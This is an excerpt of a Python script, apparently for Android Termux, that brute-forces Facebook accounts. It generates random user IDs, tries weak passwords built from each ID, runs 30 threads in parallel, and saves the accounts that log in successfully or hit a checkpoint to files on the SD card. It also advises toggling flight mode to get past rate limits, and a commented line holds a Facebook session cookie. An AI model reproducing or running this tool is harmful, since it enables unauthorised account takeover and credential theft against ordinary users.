...
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛HAJI_1 🙂💗 \x07')

try:os.mkdir('/sdcard/HAJI_1')
except:pass


###-------[LOGO]-----------####
logo= f'''  _   _              _ ______ ______ ____  
 | \ | |   /\       | |  ____|  ____|  _ \ 
 |  \| |  /  \      | | |__  | |__  | |_) |
 | . ` | / /\ \ _   | |  __| |  __| |  _ < 
 | |\  |/ ____ \ |__| | |____| |____| |_) |
...
def menu():
    ...
    linex()
    younisHAJI_1 = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisHAJI_1 in ['1','01']:
        random_number()
    elif younisHAJI_1 in ['2','02']:
        os.system("xdg-open https://www.facebook.com/rashood.khan.16")
        time.sleep(3)
        menu()
    elif younisHAJI_1 in ['3','03']:
    	os.system("xdg-open https://www.facebook.com/rashood.khan.16");time.sleep(3);menu()
    else:
...
def random_number():
    ...
    for _ in range(limit):
        ...
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as HAJI_1:
        clear()
        ...
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/HAJI_1')
        linex()
        for HAJI_1 in idz:
            uid = code+HAJI_1
            pww = [HAJI_1,uid] 
            HAJI_1.submit(crack, uid, pww, total_idz)
    linex()
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[YounisHAJI_1] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
          ...
          # 'cookie': 'ps_l=0; ps_n=0; datr=Tkq_ZRw3BJguMNjqepyZjc5V; sb=Tkq_ZbNgJMfXBImLKn5MpC12; m_pixel_ratio=1.891728162765503; wd=572x1159; fr=0qnsd5IwKprxlu5EF..Blv0pO.zg.AAA.0.0.Blv0pV.AWWZooMe_y0',
            ...
            if "session_key" in po:
                ...
                open("/sdcard/HAJI_1/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in po["error"]["message"]:
                cpclr = random.choice(["\033[1;90m","\033[1;91m","\x1b[38;5;205m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
                print(f"\r{cpclr} [HAJI_1-CP] {uid} | {pw}")
                open("/sdcard/HAJI_1/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
            else:
                continue
